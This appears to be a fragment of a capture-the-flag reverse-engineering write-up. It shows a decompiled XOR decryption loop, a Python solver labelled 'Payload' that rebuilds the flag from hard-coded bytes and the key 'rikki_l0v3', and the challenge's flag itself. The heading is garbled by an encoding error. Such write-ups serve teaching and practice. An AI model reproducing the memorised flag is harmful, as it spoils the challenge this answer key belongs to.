è§£å¯†é‚è¼¯ï¼ˆæ ¸å¿ƒï¼‰ï¼šå°å¯†æ–‡åšä¸€æ¬¡è‡ªè£½XORåŠ å¯†çš„é€†æ“ä½œ
```c
v1 = 0;
v2 = 51;
v3 = 114;
while (1) {
    *((_BYTE *)v8 + v1++) = v2 ^ v3;
    if (v1 == 45) break;
    v2 = *((_BYTE *)v8 + v1);
    v3 = v7[v1 % 0xA];
}
```
Payload:
```python
def solve_flag():
    key_string = "rikki_l0v3"
    key_bytes = [ord(c) for c in key_string]
    # key_bytes will be: [114, 105, 107, 107, 105, 95, 108, 48, 118, 51]

    initial_dword_v8 = [
        1480073267,  # 0x58363433
        1197221906,  # 0x475F6812
        254628393,   # 0x0F2D3229
        920154,      # 0x000E0A5A
        1343445007,  # 0x5015380F
        874076697,   # 0x341D3219
        1127428440,  # 0x43335158
        1510228243,  # 0x5A053113
        743978009,   # 0x2C584419
        54940467,    # 0x03465F33
        1246382110   # 0x4A47481E
    ]

    initial_v8_bytes = []
    for val_dword in initial_dword_v8:
        initial_v8_bytes.append(val_dword & 0xFF)
        initial_v8_bytes.append((val_dword >> 8) & 0xFF)
        initial_v8_bytes.append((val_dword >> 16) & 0xFF)
        initial_v8_bytes.append((val_dword >> 24) & 0xFF)
    # len(initial_v8_bytes) will be 44

    byte_from_v9 = 20  # First byte of v9 (0x0014)

    generated_flag_bytes = [0] * 45

    # These are the v2 and v3 values used for the XOR operation in each iteration
    # current_v2_operand and current_v3_operand are set *before* the XOR
    
    # Initialization for the first iteration (v1_idx = 0 at the top of the C loop)
    current_v2_operand = 51  # Initial v2 from C code
    current_v3_operand = 114 # Initial v3 from C code

    v1_loop_idx = 0 # Represents 'v1' at the start of each loop iteration in C
    while True:
        generated_flag_bytes[v1_loop_idx] = current_v2_operand ^ current_v3_operand
        
        # Corresponds to v1++ in C
        v1_after_increment = v1_loop_idx + 1 
        
        # Corresponds to if (v1 == 45) break; in C
        if v1_after_increment == 45:
            break
            
        # Prepare current_v2_operand and current_v3_operand for the *next* iteration
        # This corresponds to:
        # v2 = *((_BYTE *)v8 + v1);  (where v1 is v1_after_increment)
        # v3 = v7[v1 % 0xA]; (where v1 is v1_after_increment)

        if v1_after_increment < 44: # Reading from initial_v8_bytes
            current_v2_operand = initial_v8_bytes[v1_after_increment]
        else: # v1_after_increment must be 44 here
            current_v2_operand = byte_from_v9
            
        current_v3_operand = key_bytes[v1_after_increment % 10]
        
        v1_loop_idx += 1 # Move to next iteration index

    # Convert bytes to characters
    flag_chars = [chr(b) for b in generated_flag_bytes]
    flag = "".join(flag_chars)
    return flag

# å–å¾— Flag
reversed_flag = solve_flag()
print(f"The flag is: {reversed_flag}")
```

**Flag:**
```
AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}
```
